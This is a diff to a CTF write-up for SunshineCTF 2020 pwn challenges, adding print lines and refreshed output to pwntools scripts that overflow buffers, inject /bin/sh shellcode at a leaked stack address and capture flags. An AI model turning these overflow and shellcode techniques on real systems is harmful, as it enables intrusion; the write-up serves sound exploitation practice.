@@ -341,6 +341,8 @@ sun{warmness-on-the-soul-3b6aad1d8bb54732}
 
 ## chall_04
 ---
+Skipping ahead to challenge 4 since it is similar to 2.
+
 Decompilation:
 
 ```c
@@ -482,6 +484,7 @@ buffer = 'A' * 56
 
 io.sendline('throwaway')
 response = str(io.recvline()) # 'b"Yes I\'m going to win: 0x000xyz\\n"'
+print(response)
 
 main_address = re.search("0x[0-9a-f]+", response).group()
 offset = 0x13
@@ -504,7 +507,8 @@ meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_05.py R
     PIE:      PIE enabled
 [+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
 b"Race, life's greatest.\n"
-Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\xf7R\xbaeU\x00\x00'
+b"Yes I'm going to win: 0x56364e61876d\n"
+Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\x87aN6V\x00\x00'
 [*] Switching to interactive mode
 $ cat flag.txt
 sun{chapter-four-9ca97769b74345b1}
@@ -595,6 +599,7 @@ else:
 print(io.recvline())
 io.sendline('throwaway')
 response = str(io.recvline()) # 'b"I'll make it: 0x000xyz\\n"'
+print(response)
 stack_address = re.search("0x[0-9a-f]+", response).group()
 
 payload = asm(shellcraft.sh())
@@ -618,7 +623,8 @@ meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_03.py R
     RWX:      Has RWX segments
 [+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
 b'Just in time.\n'
-Sending:  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\x86)\x04\xfe\x7f\x00\x00'
+b"I'll make it: 0x7fff288b7cb0\n"
+Sending:  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0|\x8b(\xff\x7f\x00\x00'
 [*] Switching to interactive mode
 $ cat flag.txt
 sun{a-little-piece-of-heaven-26c8795afe7b3c49}
